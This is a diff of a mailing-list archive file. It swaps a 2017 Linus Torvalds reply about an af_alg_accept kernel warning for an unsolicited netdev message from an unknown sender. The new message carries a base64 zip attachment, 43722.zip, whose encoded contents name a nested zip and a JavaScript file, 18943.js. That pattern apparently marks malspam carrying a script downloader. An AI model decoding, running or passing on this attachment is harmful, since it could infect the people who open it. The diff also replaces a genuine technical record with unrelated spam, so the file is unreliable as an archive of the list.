@@ -1,52 +1,116 @@
-From: Linus Torvalds <torvalds@linux-foundation.org>
-Subject: Re: [GIT] Networking
-Date: Sun, 9 Jul 2017 11:49:47 -0700
-Message-ID: <CA+55aFzocFTX5JR9oG_5uKw-fT6OJUMkD71sypbec7JP=_qwpg@mail.gmail.com>
-References: <20170708.113644.1272962770645338865.davem@davemloft.net>
+From: <pooks005@yahoo.com>
+Subject: (unknown)
+Date: Sun, 09 Jul 2017 18:51:07 -0000
+Message-ID: <149962626700.27040.3892183222445118345@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Cc: Andrew Morton <akpm@linux-foundation.org>,
-        Network Development <netdev@vger.kernel.org>,
-        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
-To: David Miller <davem@davemloft.net>,
-        Sowmini Varadhan <sowmini.varadhan@oracle.com>
+Content-Type: application/zip; name="43722.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-oi0-f68.google.com ([209.85.218.68]:33714 "EHLO
-        mail-oi0-f68.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752430AbdGISts (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sun, 9 Jul 2017 14:49:48 -0400
-In-Reply-To: <20170708.113644.1272962770645338865.davem@davemloft.net>
+Received: from 1-174-27-74.dynamic-ip.hinet.net ([1.174.27.74]:42622 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752430AbdGISvV (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sun, 9 Jul 2017 14:51:21 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Sat, Jul 8, 2017 at 3:36 AM, David Miller <davem@davemloft.net> wrote:
->
-> 8) Fix socket leak on accept() in RDS, from Sowmini Varadhan.  Also
->    add a WARN_ON() to sock_graft() so other protocol stacks don't trip
->    over this as well.
-
-Hmm. This one triggers for me on both my desktop and laptop at bootup.
-Bog-standard machines, running F25 and F24 respectively.
-
-The warning doesn't seem particularly useful, although maybe that
-"alg_accept()" gives people who know this code enough of a clue.
-
-                       Linus
-
-------------[ cut here ]------------
-WARNING: CPU: 1 PID: 492 at ./include/net/sock.h:1700 af_alg_accept+0x1bf/0x1f0
-CPU: 1 PID: 492 Comm: systemd-cryptse Not tainted 4.12.0-09010-g2b976203417c #1
-Hardware name: System manufacturer System Product Name/Z170-K, BIOS
-1803 05/06/2016
-RIP: 0010:af_alg_accept+0x1bf/0x1f0
-Call Trace:
- alg_accept+0x15/0x20
- SYSC_accept4+0x105/0x210
- ? getnstimeofday64+0xe/0x20
- ? __audit_syscall_entry+0xb1/0xf0
- ? syscall_trace_enter+0x1bd/0x2d0
- ? __audit_syscall_exit+0x1a5/0x2a0
- SyS_accept+0x10/0x20
- do_syscall_64+0x61/0x140
- entry_SYSCALL64_slow_path+0x25/0x25
----[ end trace a35e5baea85df269 ]---
+UEsDBAoAAAAAAICV6Uq5IV9fIxUAACMVAAAJAAAAMTg5NDMuemlwUEsDBBQAAAAIAICV6Urc/r6c
+jRQAAE6fAAAIAAAAMTg5NDMuanO1XetzU1UQ/+6M/0MnMxnb0cH0drDtMHxo05RgrX2kQMHxQ5rc
+NoE0CXk0bR3/N0WUN/JQKIoIKE9F3g8LFm/U8fxOssvuuYQZhtmb3nsee/bs2bNnf2fff//my++/
+e/7r5fMHrn5x+Od7Tx7+8OUfJ9a/+fHBVwc2bh97cvbZw19+OPfi3pH7T9eOr1/96fC3By8funH9
+4svblx5fOHn50Matu0dPnX5w+Mz6vTu/3bh29sn5FzdPHrt3/Mbhixceff3j+p1bD89eebrxxZmr
+L9b+ePnTz1/+fv37ayfuXn5y8fnX9x9fuvXsxfqT748dv75x7+LjS+tPD/18+v43Ly8/O3Pt2z8P
+rp28f+nay9/PPDry5fUnz68++35t/ea3t+7++s0Xh64d+unZ6Y37P6/dOvrLxb/+ePzboyM3zn11
+78mZE2uPzv724Ob138+fOnDp+NP1h4eOHrj65bFTh27c+eHW8XtXbl9Yf7q28cu5i5eOnrqw8ezH
+03e+O3niwK0j5/86e+76o6tfH3x46ebxKxt/nr959uDXa48uP71w6u5XF8+sHz/14Mqvz8+fvv7t
+/VvHbj/66sWTywcvnDt5+IujN48fWDvyw3cvLz/65vCNX+8f3Lhz4u7JK1efHn37rUJyx3IjMVf9
+OJ4vzU4udW3teic5Pt8oF3fOTH2UXS7tWDKPKUPOGDJhyPGpCfNQrO/fkzSPhaDoom+eG4bsMuSQ
+ITM1Q+cNCe3xZw09MWfovT6UYshad6RRJf9SgZom4YNN8HqS7HGBJCOG7DHkFujx7IfmYdqQaUPO
+G3KHIRcmM6s7Syt188s+KHUrydOsIZcNWSLLdxptQ04Z0pYA82DJwqZpf2HaT0PLuiMkq8c+gvrg
+lXfJdtZwIIvAtU0kXyulRfMQz6XhL/A7sCzrdw969ti2tydSLUEdNVLisSo/8q6qC1bDDb1INjUH
+dTGdMWTQLfMwaEgPOxghq8xL86lUJaukOcQMMLxRIatGPhmyddDb2ybzDr7jeAcyDLxDMUHhaNDD
+myULh5erUIbFG5kjneCDLEOG5KTJ4gMpN/UK2T6/WEOtb7/Tzp98qSiKFE44WZDcph6jR9yYZUhm
+EpaxJQsVqHSRHO98wSe5VU6TUzEXYVYuQw6DmobaP4RO7yFXi12JHSDj2wy9Wjb0HCwXuw3dtFDM
+06wh5QV1x8IkKXWrhtwJPGUW2U1QhqgzDDkEvO3u7dnS9XF+BXoFjJraR/J1HKpYXdgPIrRbMqos
+jn04LRsZhpxEPu0kZz50o458cuGOrFst/hmyV7S0SAkcq4MGSEwk92YaVXK0syiRInMjpJZagj4X
+yF7USQ2E8zUDHCzjkhNhtBqwOS8vjwqtFnIIaU3XNyjqt6V0JQpaMAbMIFsV9WLRvhF4NiQWQ/O3
+IX43RE57ZosCJc9OGNraomApUW8Aq4V6qzmf3mxIDU6gwBgayIJkxaVbetc+ukWr1VKTBqN9sHhE
+ybGlBzBG64EKqB5GVqL9uF5Jg2xJn1h2csbQM5NYZAweoM+ydNJ6oMHJpLVFtqUOZc2QzMYYO2hJ
+IkmOkxpnFn7+CDraJ8pFglzPW4pr3xpa3MfB8hjxax2UdqmIMeI3tGQeWMFgtil+ejGpH/awguOk
+1mJDsgozpC1WKExYCt0uW60NQY8mgBanaILjLbkoify2BMQSi+FoTNZAS7gAiiPaqObEd5xGHb6z
+/GliLfISZqkQ0qXjpFbo9g9EcSga1Yy0uy8zYpaQTALfZcH0sFmDqMCGJYkY4QSFFE95YYEOM5sz
+qTMtppAXa6BJIarhVJke0Tw0DBg6WgI+Z5n9uSUCNAu8GRi7xXIBO+/DEIsrlDW/pe9weBklsZk0
+c/GFeFRuiajmBpifxxkpiHoJktfpYtY80Ja9YsUfpH8eitJmvPXzKx5AwTFfYxM85mE4atWN3wR/
+4Urrl8axD6eQo+h41nD4yz4nEq2rTKuKbrd0YF5MipMXtDVO4yKvg7dBOTNWl2iBiUfFZQw/zYH0
+1so0t4fomkbFnzOkrqzW0L1ZALpMrlqrpEuEYXWtBByOeqPYo15scILcB6fFFZKxVOLMwjGfLlSh
+V7LyQ+tXt7fBrqR82m+tsAAVJrhkxORhpKy2WxqN3ibgNOIMTRgcacjqVbG1qJhGmJ/lQkimefQL
++B0+cNaNZ22WnfbnbXqr3bXuo1keVeirIiNF2GJG8Q9bveIaBIO6aI08KSYr2DZRSmUz3vYM9DLT
+wbL2ofkd3QRBh3dV8mQlYo9DzzNoxjRzLEE7nOx329s5zHoh20eUW+AZgz8YOydHFR7ShR2uBMnJ
+En3sVbOOwKKOkinqr9jrK2/mnNvSEoyYpEi2LfkzJdIsyJM7v8AkG+jkNgtWZAW7Gb+UQp2JqliU
+QFGJpGUJjJM8LVV9ZlshLz4uAhVj3P6MkHB+c+jPMm5y6y4acKCcromticuzyxOFg9lKxuUVSC7E
+k9sNb3NlWxY1dzSg4QstDb28r07ehfSLs2UkGsOth/gBXWWG1h+ZHCM+vrwIyX1j/BaaeQKKIedb
+s2NZcurVcXbwW8rMYpap0V8Wp5foPwlESG+KcecBoxnm23KpgT4shW9RtLCgPOy+LMHwwohYnKjO
+mFM82upyOCnkzuHmaEsaN+pAyvpS4kuxRHalQoegydYC1OfSDIzxslxx6IUlB2iFbgjDmRzUk6XP
+3IshmTpQlI+RRki2zjmdC4gn/Cs0o3zRq5nAIzHu3KDhz7U0sV3i6eXNwYkzKGrhVhlpr6QAHE5n
+GdFV7NfIlvSH99VBNaNS7aO4YOKw0vOzQP4q++84rx1dnNjoaF8vU2I2zQx9v7xquczFfvqFzRjh
+Af3IojGSZr6oFLOivS+uMlEPmiYfIjAuDst2qeFBuzizRmAgaSHK4LmReIQUs2YFx2xSesoW28m3
+sXAcCnLCZ6PcUIizvD+8kc9sUzzF6ZZTifRWQpzmwB9Fi0L2FgRW3FlpxDvGbEj4MO4ij1eIa6KL
+gWNczN27NFhFiqaMbHlny9tvNarbh3ek4hNTO1cKS/sqY7uKq0FUbmQhQDJEarub/6crkS1djWq+
+Fp/eOz5TGN2eydZzzXe8WG/w5/5IUEp+vqu76De6RtI1v7vnE6LQT7t7urZu7Wq+NFSppFe6W0vs
++ST2aU/XZ2+/Fc/NzM2WdmUb+ysr5ero3n3z7UAm87SUQkCLAsZiaA7QQoeGwq90gE7QMS4Uw9Bv
+KiijG8Z1VzVOytV2Cw4lB1wgCKpnSwBzYmOxSc+mY7RxMMgtYLWUBpgGRezfYx7o8YROo6t6YZr2
+X2Zp/kItY4a2IE0sCgha7oRuMeSiAp7wGsggF4hPIy0dYkTeVQB+wqMzkg5xzDa4x+txA0GVqiI3
+oDwNqCfs8Luh3BTDz4GbsLHZEsbUK+LUFdg9a3zjOUdY0qCMqlGAkaRNoAxVEt0wCtCSLCChsV6y
+gUH2UMPePM28Vj61RzfWyAW2Sr9Rs2wpeF3B17xikllCqEAL6mCjIIQir+foqBe/6uOUyOSYI66c
+vUojkMuGb43vMg8WaMuQCviWIXeT08Raxi1ktMZkQPiWApbUAfhWn6H/AXJBpdCrPVOGZiBdZAOg
+Pwuk4ekG/Zo1D67GmMYEEzmrUCc+6Vuq4d4FtyMcpKt1RrcHmhh6L9lYRxDY1i4EfNHRvgUnmJcU
+12ZDvxQYaRtB7rYOWDrMWkj7BjnQliFd4Vvh9uUjTCUK9zX5nbUd6/AmrMaGQHstPGn/2Om0CQRG
+hn5lHGFeioh50SeiAFlYMC+HAbROSEUAhSWvzDtJObLJk+WUaUrg2+gMMseQjtAv8aCAHns3EJhD
+BKOXkEFgMzNiXJnl91S46Tg4B4/2ieliHmXRsFSYCveXHHfAos46KSnxmE7GBw6RYj8xwoRqJsSN
+oVPIHAcDCR1bFRtqASXHpAs6QgO+xO+4ZY2TDs6jGHYJYzCjLZAu2qCRwV2MPqi6hV14igB4FIDw
+QC6siIFvuUQTWhFQnGHTkOUskSLbwkC6oEMWpCsAclXEA7MBBi0yw5/UtxsjUhhmaOiXIcUYq86A
+wGSN5A0rQJHA1XEnCUpU0uKdQouhYzRRxStwX4bUgL6Cd+AvMsbMpbU0zxVtMjTTA67R/W8EXgYD
+zZzNywshh3y3jR4RcO8S4Q9rTdnynjooF2nabyPrm1GsEAhrU4TS5oKwGJqxFoRtNPjHQNNoG6dU
+EE+/ZZBaoiaHtowq4mzpICUn4Jr0QpxZPOfp9agqBo2GDKjHIVfs9CQmpch2WsE2nijXVge4MN/8
+fDsH2411RZdY0BvQdQbIHZMxbQq8SbRP1FWi7SxGlwzK0ZziXTGKHYK1FeRRFRP0ZC86AcPFBSzp
+IvwyYE7cexkyNJxOHOiR0PCBPpkJ4smk4jYXC1iH8Kwm+sjNrYQwObSHywwkzneCv4nTxEl+uH2U
+NTmYXT07TRD0FhybhoppV0jXiPUOB6dVxC+C/Lhh/jwW4AZSUhpVRPs6AdyiYcP20I3nsoeA71R3
+7aRq7OTjoGmlqmghvDF9GlPszmE6yMgSQ2qgOT5jZgRwteZQa+BcSQfDLmyEpVwfU4uqB6AFuO2G
+G8KIs3J6k68tRbIjqB/miAJ/PBTttzzLHEgtk7PMRF++O8eLuVhKr3/0hwpRB1Jzg3Ba4pYhtXJW
+nMFWXLYs4eHvUNFA2FpdkO2AksCjl+MuxVJE/iuC5kdEoB8qLDxrlQFphXxGNGQ0kLOqfHKngJfh
+WbojlCwqw8Zw78hcCF5DsBhWwELEsjJSV1TYA/YBFQsCk8+UGATISrWmAHfRkRQ1ccLiZJhDwFfe
+L1pfDyqgWlBsUcIt0SHC85ZBp3AN9FsALbyHqG+o1ctjHjLW1UhSuGgnPFHWdUll8RanAGTF7ACY
+i5OiAcjKUwCqmq+Zx81MZIR4O5MCxVNUAZ6DBrntu8TJWa3hkZQ41SzIlAWUokG5soWC0imyybqL
+2OF6LBbH5nIXVcJftvRkP3fU02IqKyxHcamWDWTR3hanpehRl1vJulRi0U4Iq3g3g4WHeEU0rgLn
+kHSJaPbp8M7QkKl/gVIT+5YX43Ozk/nsTn+lPp3atj2IGWzHKm2q+MFllxm/O8iKk1gud0egpvcC
+XFWkJ/i/Gaj7eZe/lC50txfbE1Q22kjlKvWp4nx8LDk5k9i9Ot7EQGHyH+iwjYaykDKGnrCQMoZm
+MDPMpfji1cQBBkpxj7pTgBODcoJKU5nKdvPEoJxSuYSc4AmTDdD5KBQZFzQBzXQ+Covr1mgzaZ2c
+kjkV6zLibROZeYPFSrkhpP4n3bFSqnhX1A0KEKWFgdIgnxr0zeG+CPbQ5KUJiQFy7f6gJ0IWFGgo
+Q3O4KNcBRrCL3Gurrwo4iyERvGFhwBr5YvjETYqA7Q6Mb0XGRYmCLkJXMnWyeRUZKxV4JGhXftEG
+BFbcYHABUFqRvUoFDoN2MLt/aM5rpGFKjqsvo5PTCxpyeIxskSZJE6xUjW2rZFPnrNRMjAGgyHXY
+GTgwiIWMQBmSMNG9PTRHP4bBhOpDI39WGZQPYnuQs6GzSCKPufRXyE/oBGJ7HA3roRqTrsnC8YyR
+9aYSFmYnQyvYfYokTeSvEQ6zA/IgY3Y4pE63QvHrMjxaCl2ByWQvfYgsKfIQyE566zykecjA5qHA
+ozwuGLnjAeqMH74qI2uk7XFCRtag9ZOW/duKKyAVp0iKo/c3iKchv5NzX3Bom5lJRVwHHn/xGVEU
+GC8XjM1EaLe26Ndl8TSvkUDJMW2SeGSl8Poo8ho4CQaULJrOcpCFInCNfluFynESsE54NsKKmiIN
+U1QMWAiPz7FFitdjCgCG6P9HM0E8ceZUjbuCwfGS1crrY3E0R9w0U+i9OuJzauIJnAxeLShCPgwZ
+HqqFS58G5Omy6dIlWoK/MNgwO+hLxueQTeSSL6HhXXG4+G5APNWYwUNZBr2jwOzIg2+BZVyOMRB+
+I8N2xOLg12HFwSy8YKVrEiUIJpIKvZN0GD+GrUNucJeOYGYCpIyMy/PCInWcwDksZifap7jmT8QV
+WRa9HDYkRirpkkgZMnw6KceodHnLtQ3DwBVbnXhLmIyXk+73KSNLFEmkoHw5iZTTFbVlf1URC4Ef
+WHghpxBDJrFULaR+i4s28jzJICvtlCL2174Ws6PIspQhFempZHUpR/26pqci61HgAVy6XmMSVYW8
+ZJ1B9CiybMv5f0XojiZ5FWOSoaNCk2pPRn2IGxw5tZUYseENyEu3Y7orN7SFC3rHYdXiMBcKL48j
+escNwmSNWZACqyZeuD8Q1qFio3fo6FbE8TAJrRDHI8tKSNZpnIluHhjkhFNCK9qLIqN8RLkKZE+h
+dMRdqBcLDiZVyavS5G7UMXkVI5TyJjY0UMMJ76O5X8NJFTfhk6J+ikuBt6HRQKwbQoXySclOEXib
+3g9YiAYxDl8GfuXC3tzOZoL1WoJwO5Tcig25LDldIPCKkE54kM3twahCg1rAm9YUU2IEpLUY0huT
+Wkb0JQw4LMuDTUSPE47HLbFUaGxbps6txNxtM4jeEW3/hCIBlSi5KPSOULrRDPzOYnasG3HDelqb
+8c6KSwJGgtc0qBxsYEdSQlmoHNFHabV+hFQDnU3/JAPNPQa9I7rx0DfslP6JQflADxSJoET2MspF
+H9Jr8Sh0cigOIUS7aHzx6CnB3C1tzZlGgAsqOCV9csUKQYEFN4SQKJyiYwMU/iuQRNzNMVwyJwWm
+SJqkgfdMXFOgFhZTpPCeWSmcxHASMcVRXAEnFAthkUlpBoXkCIKx8EiuKZwU+eJRAkLjkWghClI4
+Va1aFYzVpGuqpS2MkiMTDdnCTmdwuWUoK6BGCtQbfeBWsnz6Cnsnzp55ijBR8ZxGNjdFm1kOoe9w
+iDVw3jX1BJ5QWUiiHjbR0n8pkj7Oryztmdo3Nh4Eiu7P7m40MyJ9MPDB5s3vDw5uDpIfdQV3knbt
+XPEXZguZxP7l5Pb8VGW6a+u/SKHxsXozhnJvptGMkpxrQoj+BlBLAQI/ABQAAAAIAICV6Urc/r6c
+jRQAAE6fAAAIACQAAAAAAAAAIAAAAAAAAAAxODk0My5qcwoAIAAAAAAAAQAYABUwhv8d+dIBFTCG
+/x350gGvWm7/HfnSAVBLBQYAAAAAAQABAFoAAACzFAAAAABQSwECPwAKAAAAAACAlelKuSFfXyMV
+AAAjFQAACQAkAAAAAAAAACAAAAAAAAAAMTg5NDMuemlwCgAgAAAAAAABABgA+fSK/x350gHmkoj/
+HfnSAei7cP8d+dIBUEsFBgAAAAABAAEAWwAAAEoVAAAAAA==
